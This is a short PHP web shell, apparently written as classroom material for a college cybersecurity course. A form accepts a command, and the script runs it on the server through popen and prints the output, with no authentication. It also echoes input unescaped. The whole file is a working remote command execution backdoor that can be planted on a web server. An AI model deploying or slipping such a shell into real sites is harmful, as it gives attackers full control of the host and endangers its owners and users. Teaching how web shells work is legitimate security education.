<!-- Created by Dr. Poteete for Cybersecurity at Geneva College -->
<form method="post" enctype="multipart/form-data">
	<b>Command:</b><input type="text" size="80" name="cmd" value="<?= $cmd ?> "> <input type="submit" value="Execute">
	<hr>
</form>

<?php
$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
if (!empty($cmd)) {
	echo '<pre><b>RemoteHost> <font color="red">' . $cmd . '</b></font><hr>';
	$p = popen('exec 2>&1; ' . $cmd, 'r');
	while (!feof($p)) {
		echo fread($p, 4096);
		@flush();
	}
	echo "</pre>";
}
?>
